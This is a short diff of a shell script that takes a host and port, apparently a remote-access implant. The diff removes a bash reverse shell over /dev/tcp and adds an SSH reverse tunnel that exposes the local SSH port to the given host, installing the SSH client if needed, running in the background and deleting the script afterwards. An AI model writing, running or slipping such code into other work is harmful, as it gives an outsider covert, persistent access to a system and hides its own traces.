@@ -2,6 +2,15 @@
 S="$0"
 H=$1
 P=$2
-/bin/bash -c /bin/bash -i > /dev/tcp/$H/$P 0<&1 2>&1 &
-disown $!
+
+
+# Check if SSH client is installed
+if ! command -v ssh &> /dev/null; then
+    apt-get update && apt-get install -y openssh-client
+fi
+
+# Start SSH reverse tunnel in background
+ssh -f -N -R ${P}:localhost:22 ${H}
+
+# Remove script
 rm -f "$S"
